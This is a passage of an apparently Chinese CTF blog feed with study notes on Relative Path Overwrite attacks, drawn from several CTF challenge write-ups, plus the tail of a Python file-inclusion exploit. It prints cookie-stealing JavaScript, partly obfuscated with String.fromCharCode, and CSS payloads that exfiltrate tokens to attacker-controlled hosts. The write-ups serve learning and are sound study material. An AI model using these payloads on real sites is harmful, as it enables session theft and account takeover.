&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#75af00">in&lt;/span> &lt;span style="color:#75af00">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">times&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] %d / %d&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">times&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">upload_file_to_include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">phpinfo_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">generate_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反弹shell，suid提权后翻找flag&lt;/p></description></item><item><title>RPO攻击学习笔记</title><link>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</link><pubDate>Sun, 24 Apr 2022 21:39:29 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</guid><description>&lt;p>&lt;a href="http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/">http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/&lt;/a>&lt;/p>
&lt;hr>
&lt;p>RPO指Relative Path Overwrite 相对路径覆盖，利用浏览器和服务器的解析差异 将页面中使用相对路径引入的静态资源文件进行替换，完成RPO攻击&lt;/p>
&lt;p>最常见的就是对url path的解析差异，比如这样的url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.31.175/test%2findex.html
&lt;/code>&lt;/pre>&lt;p>默认情况下apache会认为请求的是&lt;code>test%2findex.html&lt;/code>，无法访问，而Nginx会将&lt;code>%2f&lt;/code>解析为&lt;code>/&lt;/code> 从而认为请求的是test文件夹下的&lt;code>index.html&lt;/code>，正常访问（可以通过修改路由规则来影响这些）&lt;/p>
&lt;p>另一个需要满足的条件是页面静态资源文件的相对路径，以下面的题为例&lt;/p>
&lt;h2 id="强网杯-2018share-mind">[强网杯 2018]share mind&lt;/h2>
&lt;p>*没有找到docker文件，以下内容参考&lt;a href="https://yangrz.github.io/blog/2018/03/27/ctf/">wp1&lt;/a> | &lt;a href="https://xz.aliyun.com/t/2220">wp2&lt;/a>&lt;/p>
&lt;p>我们可以在report页面给bot提交一个link，还可以写note，如果不写标题只写内容的话在view时文章页面是直接打印的内容（无&lt;code>&amp;lt;h1&amp;gt;&lt;/code>），而两个都写了的话是把文章标题和内容都输出在html标签之间的（有&lt;code>&amp;lt;h1&amp;gt;&lt;/code>）&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind6.png" alt="share your mind6">&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind7.png" alt="share your mind7">&lt;/p>
&lt;p>在页面源码中我们可以发现jquery.min.js这个文件是使用的相对路径的方式引入到index.php页面&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind8.png" alt="share your mind8">&lt;/p>
&lt;p>也就是说如果访问的页面是&lt;code>http://39.107.33.96:20000/index.php/&lt;/code>则会引入&lt;code>http://39.107.33.96:20000/index.php/static/js/jquery.min.js&lt;/code>，结合我们前面提过的url解析问题，如果访问的页面是&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code> 浏览器则会尝试引入&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.js&lt;/code>，而这个url请求的页面实际上还是我们的Note，也就是note内容将作为jquery.min.js被引入页面，如果note部分是payload，那么访问&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code>就会执行&lt;/p>
&lt;p>我们可以构造类似这样的payload来偷cookie&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://vps-ip:port/?cookie=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>页面对引号做了转义，我们用&lt;code>String.fromCharCode&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">58&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie提示我们打另一个目录，构造exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iframe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">95&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">)).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y1r0nz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">107&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">61&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过浏览器渲染以后就是下述的两行html代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;frame&amp;#34;&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/QWB_fl4g/QWB/&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;prefetch&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>prefetch属性规定了当前文档在链接文档之前被调用，这样就可以外带对应路径下的cookie了&lt;/p>
&lt;h2 id="pwnhub-0618大物必须过">[pwnhub 0618]大物必须过&lt;/h2>
&lt;p>&lt;a href="https://pwnhub.cn/media/writeup/113/29b7f18c-b1f2-4cfc-8f84-1b3793c52a7a_9f56fde2.pdf">wp&lt;/a> | &lt;a href="https://blog.csdn.net/Fly_hps/article/details/80613543">wp2&lt;/a>&lt;/p>
&lt;p>report_bug.php页面可以提交link，classes.php页面引入css时使用了相对路径进行加载&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">linkrel&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">=&amp;#34;&lt;/span>&lt;span style="color:#75af00">stylesheet&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#34;&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/css&amp;#34;&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../classes.css&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>与上面的思路相同，payload&lt;/p>
&lt;pre tabindex="0">&lt;code>http://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0
&lt;/code>&lt;/pre>&lt;p>当访问这个url时，classes.css会被/user.php/69对应的内容所覆盖&lt;/p>
&lt;p>至于payload的内容，不同于我们常见的js payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background-image&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://vpsip&lt;/span>&lt;span style="color:#111">);}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="36c3ctf-2018urlstorage">[36c3CTF 2018]urlstorage&lt;/h2>
&lt;p>&lt;a href="https://github.com/eboda/34c3ctf/tree/master/urlstorage">dockerfile&lt;/a> | &lt;a href="https://www.cnblogs.com/iamstudy/articles/2017_34C4_web_urlstorage_writeup.html">wp&lt;/a> （由于dockerfile用的ubuntu17 无法复现）&lt;/p>
&lt;p>页面的css加载使用相对路径（可以进行rpo 控制css），csp信息如下&lt;/p>
&lt;pre tabindex="0">&lt;code>frame-ancestors &amp;#39;none&amp;#39;; form-action &amp;#39;self&amp;#39;; connect-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39;; font-src &amp;#39;self&amp;#39; ; style-src &amp;#39;self&amp;#39;;
&lt;/code>&lt;/pre>&lt;p>/urlstorage处可以提交name和url，存在csrf（可以任意修改他人的url）&lt;/p>
&lt;p>/flag?token=xxx处存在xss&lt;/p>
&lt;p>思路：通过可以覆盖的css信息模糊匹配/爆破出flag&lt;/p>
&lt;p>首先是爆破token，第一位字符：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">f&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=f&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二位字符：&lt;/p>
